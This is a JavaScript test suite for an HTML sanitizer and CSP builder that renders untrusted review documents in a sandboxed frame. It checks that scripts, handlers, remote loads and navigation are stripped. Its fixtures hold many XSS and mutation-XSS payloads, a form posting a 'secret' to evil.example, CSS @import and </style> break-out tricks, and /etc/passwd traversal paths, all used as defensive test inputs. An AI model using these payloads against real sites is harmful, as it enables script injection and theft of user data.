import assert from "node:assert/strict";
import { test } from "node:test";

import { parseReviewRevision, ReviewContractError } from "./reviewContract.ts";
import {
  buildFrameCsp,
  buildFrameDocument,
  createFrameNonce,
  parseReviewDocument,
  scrubCss,
} from "./reviewDocument.ts";
import { loadReviewDocument } from "./reviewDocumentLoader.ts";
import { reviewEvent, THREE_BLOCK_HTML } from "./reviewFixtures.mjs";

const ANNOTATOR = "https://app.example/synaxis-review-annotator.js";
const NONCE = "AAAAAAAAAAAAAAAAAAAAAAAA";

function compose(html, nonce = NONCE) {
  return buildFrameDocument(parseReviewDocument(html), {
    nonce,
    annotatorSrc: ANNOTATOR,
  });
}

function reparse(srcdoc) {
  return new DOMParser().parseFromString(srcdoc, "text/html");
}

/** Hostile factory output exercising every active-content class. */
const HOSTILE_HTML = `<!doctype html>
<html onload="steal()" lang="en">
<head>
<meta http-equiv="refresh" content="0;url=https://evil.example/">
<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">
<base href="https://evil.example/">
<link rel="stylesheet" href="https://evil.example/x.css">
<link rel="preload" href="https://evil.example/p">
<title>hostile</title>
<style>@import url("https://evil.example/a.css"); .a{background:url(https://evil.example/bg.png)} .b{background:url("data:image/png;base64,AAAA")} .c{background:image-set("https://evil.example/i.png" 1x)}</style>
<script>window.parent.postMessage("owned","*")</script>
</head>
<body onload="steal()" style="background:url(https://evil.example/body)" class="page">
<section data-synaxis-review-id="hostile.one" data-synaxis-review-title="One" onclick="steal()" onmouseover="steal()">
  <img src="https://evil.example/pixel.png" onerror="steal()" alt="remote">
  <img src="data:image/png;base64,AAAA" alt="inline">
  <img srcset="https://evil.example/a.png 1x" src="javascript:steal()">
  <a href="javascript:steal()">js</a>
  <a href="https://evil.example/" target="_blank">out</a>
  <form action="https://evil.example/collect" method="post"><input name="secret"><button formaction="https://evil.example/b">Go</button></form>
  <iframe src="https://evil.example/frame"></iframe>
  <iframe srcdoc="<script>parent.x()</script>"></iframe>
  <object data="https://evil.example/o.swf"></object><embed src="https://evil.example/e">
  <svg onload="steal()" width="10" height="10"><script>steal()</script><use href="https://evil.example/s.svg#x"/><use href="#local"/><foreignObject><div>fo</div></foreignObject><animate attributeName="href" to="javascript:steal()"/><set attributeName="href" to="javascript:steal()"/></svg>
  <math><mi>x</mi></math>
  <noscript><img src="https://evil.example/ns.png" onerror="steal()"></noscript>
  <template><script>steal()</script></template>
  <!-- <script>steal()</script> -->
  <video src="https://evil.example/v.mp4" poster="https://evil.example/p.png"></video>
  <button onclick="steal()" tabindex="5" autofocus>x</button>
  <div contenteditable="true" style="width:expression(steal())">editable</div>
</section>
<noscript><section data-synaxis-review-id="hostile.fake" data-synaxis-review-title="Fake"></section></noscript>
<template><section data-synaxis-review-id="hostile.template" data-synaxis-review-title="Template"></section></template>
<script>document.write('<section data-synaxis-review-id="hostile.written" data-synaxis-review-title="Written"></section>')</script>
<section data-synaxis-review-id="hostile.two" data-synaxis-review-title="Two">two</section>
<section data-synaxis-review-id="hostile.three" data-synaxis-review-title="Three">three</section>
</body>
</html>`;

// ── Hostile content never reaches the composed frame ────────────────────────

test("hostile HTML composes into a frame with no active content or remote reference", () => {
  const srcdoc = compose(HOSTILE_HTML);
  assert.equal(
    srcdoc.includes("evil.example"),
    false,
    "no remote reference survives",
  );
  assert.equal(/javascript:/i.test(srcdoc), false);
  assert.equal(/expression\s*\(/i.test(srcdoc), false);
  assert.equal(srcdoc.includes("steal"), false);
  assert.equal(srcdoc.includes("owned"), false);

  const doc = reparse(srcdoc);
  const everything = [...doc.querySelectorAll("*")];
  for (const element of everything) {
    for (const attribute of element.attributes) {
      assert.equal(
        attribute.name.toLowerCase().startsWith("on"),
        false,
        `${element.localName} keeps ${attribute.name}`,
      );
    }
  }
  for (const banned of [
    "iframe",
    "object",
    "embed",
    "form",
    "base",
    "link",
    "noscript",
    "template",
    "math",
    "foreignobject",
    "animate",
    "set",
    "video",
    "audio",
  ]) {
    assert.equal(doc.querySelectorAll(banned).length, 0, `<${banned}> removed`);
  }
  for (const attribute of [
    "href",
    "target",
    "formaction",
    "action",
    "srcset",
    "contenteditable",
    "tabindex",
    "autofocus",
  ]) {
    const kept = [...doc.querySelectorAll(`[${attribute}]`)].filter(
      (element) => !(element.localName === "use" && attribute === "href"),
    );
    assert.equal(kept.length, 0, `${attribute} removed`);
  }
});

test("exactly one script survives: the nonce-bearing annotator", () => {
  const doc = reparse(compose(HOSTILE_HTML));
  const scripts = [...doc.querySelectorAll("script")];
  assert.equal(scripts.length, 1);
  assert.equal(scripts[0].getAttribute("nonce"), NONCE);
  assert.equal(scripts[0].getAttribute("src"), ANNOTATOR);
  assert.equal(scripts[0].textContent, "");
  assert.equal(doc.querySelectorAll("script:not([nonce])").length, 0);
});

test("the CSP meta is the first head element and denies network, frames, forms, and inline script", () => {
  const doc = reparse(compose(HOSTILE_HTML));
  const first = doc.head.firstElementChild;
  assert.equal(first.localName, "meta");
  assert.equal(first.getAttribute("http-equiv"), "Content-Security-Policy");
  assert.equal(first.getAttribute("content"), buildFrameCsp(NONCE));
  const csp = first.getAttribute("content");
  for (const directive of [
    "default-src 'none'",
    `script-src 'nonce-${NONCE}'`,
    "connect-src 'none'",
    "frame-src 'none'",
    "object-src 'none'",
    "form-action 'none'",
    "base-uri 'none'",
    "img-src data:",
  ]) {
    assert.ok(csp.includes(directive), directive);
  }
  // `style-src 'unsafe-inline'` is legitimate, so inspect script directives
  // by name rather than searching the whole policy.
  const directives = csp
    .split(";")
    .map((directive) => directive.trim())
    .filter(Boolean)
    .map((directive) => {
      const [name, ...sources] = directive.split(/\s+/);
      return { name: name.toLowerCase(), sources };
    });
  const scriptDirectives = directives.filter(
    ({ name }) => name === "script-src",
  );
  assert.equal(scriptDirectives.length, 1, "exactly one script-src");
  assert.deepEqual(scriptDirectives[0].sources, [`'nonce-${NONCE}'`]);
  for (const { name, sources } of directives) {
    if (!name.startsWith("script-src") && name !== "default-src") continue;
    for (const source of sources) {
      assert.doesNotMatch(
        source,
        /unsafe-(inline|eval)/i,
        `${name}: ${source}`,
      );
    }
  }
  // The artifact's own CSP meta was discarded, not merged.
  assert.equal(doc.querySelectorAll("meta[http-equiv]").length, 1);
});

test("data-URI images, same-document sprites, and structure survive sanitization", () => {
  const doc = reparse(compose(HOSTILE_HTML));
  const images = [...doc.querySelectorAll("img")];
  assert.ok(
    images.some(
      (img) => img.getAttribute("src") === "data:image/png;base64,AAAA",
    ),
  );
  assert.equal(images.filter((img) => img.hasAttribute("onerror")).length, 0);
  assert.equal(
    images.filter((img) => (img.getAttribute("src") ?? "").startsWith("http"))
      .length,
    0,
  );
  assert.equal(doc.querySelectorAll('use[href="#local"]').length, 1);
  assert.equal(doc.querySelectorAll('use[href^="https"]').length, 0);
  // The form's inputs stay (layout), but the form itself is gone.
  assert.equal(doc.querySelectorAll("input[name=secret]").length, 1);
  assert.equal(doc.body.className, "page");
  assert.equal(doc.documentElement.getAttribute("lang"), "en");
});

test("CSS keeps data URIs but loses imports, remote urls, image-set, and expressions", () => {
  const css = scrubCss(
    `@import url("https://evil.example/a.css");
     .a{background:url(https://evil.example/x.png)}
     .b{background:url('data:image/png;base64,AAAA')}
     .c{background:image-set("https://evil.example/i.png" 1x)}
     .d{width:expression(steal())}`,
  );
  assert.equal(css.includes("evil.example"), false);
  assert.ok(css.includes("data:image/png;base64,AAAA"));
  assert.equal(/image-set\s*\(/.test(css), false);
  assert.equal(/expression\s*\(/.test(css), false);
});

/** `@import;` is deleted by the scrubber, which splices `</style>` together. */
const SPLICED_CLOSE =
  '<@import;/style><meta http-equiv="refresh" content="0;url=https://evil.example/">';
const BLOCK =
  '<section data-synaxis-review-id="a" data-synaxis-review-title="A">x</section>';

function assertNoMaterializedNavigation(srcdoc) {
  const doc = reparse(srcdoc);
  // Only the trusted CSP and charset metas exist; nothing artifact-derived.
  const metas = [...doc.querySelectorAll("meta")];
  assert.equal(metas.length, 2);
  assert.equal(
    metas.some(
      (meta) => meta.getAttribute("http-equiv")?.toLowerCase() === "refresh",
    ),
    false,
    "no refresh materialized",
  );
  assert.equal(doc.querySelectorAll("meta[http-equiv]").length, 1);
  assert.equal(doc.querySelectorAll("script").length, 1);
  assert.equal(doc.querySelectorAll("link, base, iframe, object").length, 0);
  return doc;
}

test("a sanitizer-created </style> in a head stylesheet cannot materialize a meta refresh", () => {
  const html = `<!doctype html><html><head><style>${SPLICED_CLOSE}</style></head><body>${BLOCK}</body></html>`;
  // The attack is inert in the first parse: one style element, no meta.
  const inert = new DOMParser().parseFromString(html, "text/html");
  assert.equal(inert.querySelectorAll("meta").length, 0);

  const parsed = parseReviewDocument(html);
  assert.equal(parsed.headStyles.length, 1);
  assert.equal(
    parsed.headStyles[0].includes("<"),
    false,
    "sanitized CSS carries no literal <",
  );
  const srcdoc = buildFrameDocument(parsed, {
    nonce: NONCE,
    annotatorSrc: ANNOTATOR,
  });
  const doc = assertNoMaterializedNavigation(srcdoc);
  // Head: CSP, charset, chrome, and exactly the one artifact stylesheet,
  // whose text is the escaped, inert remainder.
  assert.equal(doc.head.children.length, 4);
  const artifact = doc.head.children[3];
  assert.equal(artifact.localName, "style");
  assert.ok(artifact.textContent.startsWith("\\3c /style>"));
  assert.equal(artifact.textContent.includes("<"), false);
});

test("a sanitizer-created </style> in a retained body stylesheet cannot break out either", () => {
  const html = `<!doctype html><html><head></head><body><style>${SPLICED_CLOSE}</style>${BLOCK}</body></html>`;
  const srcdoc = compose(html);
  const doc = assertNoMaterializedNavigation(srcdoc);
  const styles = [...doc.body.querySelectorAll("style")];
  assert.equal(styles.length, 1);
  assert.equal(styles[0].textContent.includes("<"), false);
  assert.equal(doc.querySelectorAll("[data-synaxis-review-id]").length, 1);
});

test("svg stylesheets and inline style attributes are escaped the same way", () => {
  const html = `<!doctype html><html><body><svg width="1" height="1"><style>${SPLICED_CLOSE}</style></svg><div style="${SPLICED_CLOSE.replaceAll('"', "&quot;")}">${BLOCK}</div></body></html>`;
  const doc = assertNoMaterializedNavigation(compose(html));
  for (const element of doc.querySelectorAll("style, [style]")) {
    const text =
      element.localName === "style"
        ? element.textContent
        : element.getAttribute("style");
    assert.equal(text.includes("<"), false, element.outerHTML);
  }
});

test("scrubbing runs to a fixpoint, so deleting a match cannot splice a new one", () => {
  const spliced = scrubCss("@imp@import;ort url(https://evil.example/a.css);");
  assert.equal(/@import/i.test(spliced), false);
  assert.equal(spliced.includes("evil.example"), false);
  // Each deletion re-forms one level of `@import;`; nested deeper than the
  // pass budget the stylesheet is dropped whole, never returned half-scrubbed.
  const deep = `${"@imp".repeat(20)}@import;${"ort;".repeat(20)}`;
  assert.equal(scrubCss(deep), "");
  const shallow = `${"@imp".repeat(3)}@import;${"ort;".repeat(3)}.keep{x:y}`;
  assert.equal(scrubCss(shallow), ".keep{x:y}");
  // `<` is escaped after every removal, so text that becomes `</style>` is inert.
  assert.equal(scrubCss("</sty@import;le>"), "\\3c /style>");
  // Idempotent: a scrubbed stylesheet is already a fixpoint.
  const once = scrubCss("a{b:url(https://x/y)} <!-- .c{d:e} -->");
  assert.equal(scrubCss(once), once);
  assert.equal(once.includes("<"), false);
});

test("the final frame is audited: hostile text that survives to composition fails closed", () => {
  const parsed = parseReviewDocument(`<!doctype html><body>${BLOCK}</body>`);
  const options = { nonce: NONCE, annotatorSrc: ANNOTATOR };
  // Defence in depth at the sink: raw CSS handed straight to composition is
  // escaped there rather than trusted.
  const rawHead = {
    ...parsed,
    headStyles: [
      '</style><meta http-equiv="refresh" content="0;url=https://evil.example/">',
    ],
  };
  assertNoMaterializedNavigation(buildFrameDocument(rawHead, options));

  // Markup that reparses into active content is refused outright.
  for (const bodyHtml of [
    `${parsed.bodyHtml}<meta http-equiv="refresh" content="0;url=https://evil.example/">`,
    `${parsed.bodyHtml}<script>steal()</script>`,
    `${parsed.bodyHtml}<img src="x" onerror="steal()">`,
    `${parsed.bodyHtml}<a href="https://evil.example/">x</a>`,
    `${parsed.bodyHtml}<section data-synaxis-review-id="undeclared" data-synaxis-review-title="U"></section>`,
  ]) {
    assert.throws(
      () => buildFrameDocument({ ...parsed, bodyHtml }, options),
      ReviewContractError,
      bodyHtml,
    );
  }
});

test("a mutation-XSS payload cannot regain script, handlers, or remote loads on reparse", () => {
  const payloads = [
    `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=steal()&gt;">`,
    `<svg></p><style><a id="</style><img src=1 onerror=steal()>">`,
    `<noscript><p title="</noscript><img src=x onerror=steal()>">`,
    `<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=steal() src=1>">`,
  ];
  for (const payload of payloads) {
    const html = `<!doctype html><body><section data-synaxis-review-id="x" data-synaxis-review-title="X">${payload}</section></body>`;
    const srcdoc = compose(html);
    const doc = reparse(srcdoc);
    assert.equal(
      [...doc.querySelectorAll("*")].some((element) =>
        [...element.attributes].some((a) => a.name.startsWith("on")),
      ),
      false,
      payload,
    );
    assert.equal(srcdoc.includes("steal"), false, payload);
    assert.equal(doc.querySelectorAll("script").length, 1);
  }
});

test("composition rejects malformed nonces and escapes the annotator URL", () => {
  const document = parseReviewDocument(THREE_BLOCK_HTML);
  assert.throws(
    () =>
      buildFrameDocument(document, { nonce: "short", annotatorSrc: ANNOTATOR }),
    ReviewContractError,
  );
  assert.throws(() =>
    buildFrameDocument(document, {
      nonce: `${NONCE}"><script>x</script>`,
      annotatorSrc: ANNOTATOR,
    }),
  );
  const tricky = buildFrameDocument(document, {
    nonce: NONCE,
    annotatorSrc: 'https://app.example/a.js?"onload="steal()',
  });
  const script = reparse(tricky).querySelector("script");
  assert.equal(script.hasAttribute("onload"), false);
  assert.equal(createFrameNonce().length, 24);
  assert.notEqual(createFrameNonce(), createFrameNonce());
});

// ── Block hover, focus, and selection chrome ────────────────────────────────

/** The composed frame's first-party chrome stylesheet, split into rules. */
function chromeRules(srcdoc) {
  const styles = [...reparse(srcdoc).head.querySelectorAll("style")];
  const [chrome, ...artifact] = styles;
  const matches = chrome.textContent.matchAll(/([^{}]+)\{([^{}]*)\}/g);
  const rules = [...matches].map(([, selector, body]) => ({
    selector: selector.trim(),
    body,
  }));
  return { chrome, artifact, rules, css: chrome.textContent };
}

function relativeLuminance(hex) {
  const channel = (offset) => {
    const value = Number.parseInt(hex.slice(offset, offset + 2), 16) / 255;
    return value <= 0.03928 ? value / 12.92 : ((value + 0.055) / 1.055) ** 2.4;
  };
  return 0.2126 * channel(1) + 0.7152 * channel(3) + 0.0722 * channel(5);
}

function contrastRatio(a, b) {
  const [light, dark] = [relativeLuminance(a), relativeLuminance(b)].sort(
    (x, y) => y - x,
  );
  return (light + 0.05) / (dark + 0.05);
}

test("block chrome is a layered, important, two-layer halo emitted before any artifact style", () => {
  const srcdoc = compose(HOSTILE_HTML);
  const { chrome, artifact, rules, css } = chromeRules(srcdoc);

  // Declared first, so its cascade layer outranks every artifact style.
  assert.equal(chrome.hasAttribute("data-synaxis-review-chrome"), true);
  assert.ok(artifact.length >= 1);
  assert.equal(
    artifact.some((style) => style.hasAttribute("data-synaxis-review-chrome")),
    false,
  );
  assert.ok(css.includes(`@layer synaxis-review-chrome-${NONCE} {`));
  // A document-specific layer name cannot be joined from artifact CSS.
  const other = chromeRules(compose(HOSTILE_HTML, "BBBBBBBBBBBBBBBBBBBBBBBB"));
  assert.ok(!other.css.includes(`synaxis-review-chrome-${NONCE}`));

  for (const { selector, body } of rules) {
    assert.match(selector, /^html body (?:\[data-synaxis-review-id\]){3}/);
    for (const declaration of body.split(";")) {
      if (declaration.trim()) {
        assert.match(
          declaration,
          /!important\s*$/,
          `${selector}: ${declaration}`,
        );
      }
    }
  }

  const widthOf = (body) => Number(/outline:\s*(\d+)px/.exec(body)?.[1]);
  const state = (suffix) =>
    rules.find((rule) => rule.selector.endsWith(suffix));
  const hover = state(":hover");
  const focus = state(":focus-visible");
  const selected = state('[data-synaxis-selected="true"]');
  for (const rule of [hover, focus, selected]) {
    assert.ok(rule, "hover, focus, and selection each have a rule");
    // Two layers: an ink outline over a white box-shadow halo.
    assert.match(
      rule.body,
      /outline:\s*\d+px (?:solid|dashed) #0f172a !important/,
    );
    assert.match(rule.body, /box-shadow:\s*0 0 0 \d+px #ffffff !important/);
  }
  // States differ by shape and weight, not only by colour.
  assert.match(hover.body, /dashed/);
  assert.match(focus.body, /solid/);
  assert.ok(widthOf(selected.body) > widthOf(focus.body));
  assert.ok(focus.selector.includes(":focus,"), ":focus is covered as well");
});

test("the halo keeps 3:1 non-text contrast on every background through one of its layers", () => {
  const { rules } = chromeRules(compose(THREE_BLOCK_HTML));
  const focus = rules.find((rule) => rule.selector.endsWith(":focus-visible"));
  const ink = /outline:\s*\d+px solid (#[0-9a-f]{6})/.exec(focus.body)[1];
  const halo = /box-shadow:\s*0 0 0 \d+px (#[0-9a-f]{6})/.exec(focus.body)[1];

  // The dark and light layers touch, so each reads against the other.
  assert.ok(contrastRatio(ink, halo) >= 3);
  for (let level = 0; level <= 255; level += 1) {
    const gray = `#${level.toString(16).padStart(2, "0").repeat(3)}`;
    assert.ok(
      Math.max(contrastRatio(ink, gray), contrastRatio(halo, gray)) >= 3,
      `gray ${gray}`,
    );
  }
  for (const background of ["#2563eb", "#1d4ed8", "#1e3a8a", "#3b82f6"]) {
    const best = Math.max(
      contrastRatio(ink, background),
      contrastRatio(halo, background),
    );
    assert.ok(best >= 3, background);
  }
});

// ── Block markers ───────────────────────────────────────────────────────────

test("the three-block fixture exposes exactly its declared blocks in order", () => {
  const { blocks } = parseReviewDocument(THREE_BLOCK_HTML);
  assert.deepEqual(blocks, [
    { id: "checkout.header", title: "Checkout header", sourceRef: null },
    {
      id: "checkout.primary-action",
      title: "Primary checkout action",
      sourceRef: "src/features/checkout/CheckoutActions.tsx",
    },
    { id: "checkout.summary", title: "Order summary", sourceRef: null },
  ]);
});

test("markers hidden in removed content or written by script are not blocks", () => {
  const { blocks } = parseReviewDocument(HOSTILE_HTML);
  assert.deepEqual(
    blocks.map((block) => block.id),
    ["hostile.one", "hostile.two", "hostile.three"],
  );
});

test("marker violations reject the whole document instead of dropping blocks", () => {
  const section = (attrs) => `<!doctype html><body>${attrs}</body>`;
  const cases = {
    "duplicate id": section(
      `<p data-synaxis-review-id="a" data-synaxis-review-title="A"></p><p data-synaxis-review-id="a" data-synaxis-review-title="B"></p>`,
    ),
    "missing title": section(`<p data-synaxis-review-id="a"></p>`),
    "blank title": section(
      `<p data-synaxis-review-id="a" data-synaxis-review-title="   "></p>`,
    ),
    "empty id": section(
      `<p data-synaxis-review-id="" data-synaxis-review-title="A"></p>`,
    ),
    "unsafe id": section(
      `<p data-synaxis-review-id="a&quot;]b" data-synaxis-review-title="A"></p>`,
    ),
    "traversal source": section(
      `<p data-synaxis-review-id="a" data-synaxis-review-title="A" data-synaxis-source-ref="../../etc/passwd"></p>`,
    ),
    "absolute source": section(
      `<p data-synaxis-review-id="a" data-synaxis-review-title="A" data-synaxis-source-ref="/etc/passwd"></p>`,
    ),
    "too many blocks": section(
      Array.from(
        { length: 201 },
        (_, i) =>
          `<p data-synaxis-review-id="b${i}" data-synaxis-review-title="B"></p>`,
      ).join(""),
    ),
  };
  for (const [name, html] of Object.entries(cases)) {
    assert.throws(() => parseReviewDocument(html), ReviewContractError, name);
  }
  assert.deepEqual(
    parseReviewDocument("<!doctype html><body><p>plain</p></body>").blocks,
    [],
  );
});

// ── Verified loading ────────────────────────────────────────────────────────

function loaderFixture() {
  const revision = parseReviewRevision(reviewEvent());
  const bytes = new TextEncoder().encode(THREE_BLOCK_HTML);
  return { revision, bytes };
}

test("verified bytes load into a parsed review document", async () => {
  const { revision, bytes } = loaderFixture();
  const calls = [];
  const document = await loadReviewDocument(revision, async (input) => {
    calls.push(input);
    return bytes;
  });
  assert.equal(document.blocks.length, 3);
  assert.deepEqual(calls, [
    {
      url: revision.document.url,
      expectedSha256: revision.document.sha256,
      expectedSize: revision.document.size,
    },
  ]);
});

test("bytes that do not match the signed hash or size are never parsed or rendered", async () => {
  const { revision, bytes } = loaderFixture();

  // Same length, different content: the hash is the only thing that catches it.
  const tampered = new TextEncoder().encode(
    THREE_BLOCK_HTML.replace("Pay now", "Pay NOW"),
  );
  assert.equal(tampered.length, bytes.length);
  await assert.rejects(
    loadReviewDocument(revision, async () => tampered),
    /SHA-256/,
  );

  await assert.rejects(
    loadReviewDocument(revision, async () => bytes.slice(0, bytes.length - 1)),
    /size/,
  );

  const invalidUtf8 = new Uint8Array(bytes);
  invalidUtf8[10] = 0xff;
  await assert.rejects(loadReviewDocument(revision, async () => invalidUtf8));

  await assert.rejects(
    loadReviewDocument(revision, async () => {
      throw new Error("relay unreachable");
    }),
    /relay unreachable/,
  );
});
